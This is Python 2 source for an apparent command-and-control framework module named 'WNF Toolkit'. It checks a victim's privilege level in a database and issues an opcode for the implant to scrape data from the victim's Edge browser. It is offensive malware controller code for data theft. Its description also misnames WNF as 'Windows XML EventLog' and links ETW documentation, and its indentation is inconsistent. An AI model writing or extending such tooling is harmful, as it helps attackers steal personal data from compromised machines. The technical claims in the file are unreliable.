from support import database

#Standard class name for each module when invoking
class IllusiveFogModule:
    def __init__(self,params=[]):
        self.params= params

        #Module Information
        self.info={
            'Name'       : 'WNF Toolkit',
            'Description': 'Module Aims to perform operations using WNF (Windows XML EventLog).',
            'Author'     : 'Internal Dev Team',
            'Escalated'  :  True
        }

        #Module Options
        self.options={
            'Operation': self.params[1],
            'Victim': self.params[0]
        }

        #Module Help
        self.modulehelp = """
        WNF ToolKIT
        ===========
        Description : Module Aims to perform operations using WNF.
        URLS        : https://docs.microsoft.com/en-us/windows/win32/etw/event-tracing-portal
        
        Options :
            FetchData  -  Fetch Data via notigication subscription to following applications:
                                1; Edge : Scrap Data from Edge Browser.
        
        Example command:
                WNF FetchData Edge. 
        """

#Main function which will be called, Must return
    def run(self):

        #saving options
        self.operation=self.options['Operation']
        self.victim = self.options['Victim']
        
        #print info about module
        print ""
        print "Module Info:"
        print "-----------"
        print "Name :"+self.info['Name'] 
        print "Description :"+self.info['Description']
        print "Author :"+self.info['Author']
        print "[info] For more info about module usage, use option 'help'. example: WNF help"
        print "\n"
        
        if self.info['Escalated'] == True:
            #Operations Alias
                self.FetchDataOp = "0xAA "

            #if database.Victim().FetchVictimOS(self.victim) != "":

                #Check Privileges
                if database.Victim().FetchVictimPrivLvl(self.victim) != "1":
                    print "[-] Operation cannot be initiated since Victim is not privileged enough."
                    return False
                else:
                    self.initOperation=self.operation.split()
                    if self.initOperation[0] == "help":
                        print self.modulehelp
                        return None 
                    elif self.initOperation[0] == "FetchData":
                        return self.FetchDataProc()
                    else:
                        print "[ERROR] Invalid Operation."
    

#Fetch Data from Subscribed processes.
    def FetchDataProc(self):
        if len(self.initOperation) < 2:
            print "[Error] No Enough options."
            return None
        else:
            if self.initOperation[1] == "Edge":
                EdgeAlias = "0x0A"
                return self.FetchDataOp + EdgeAlias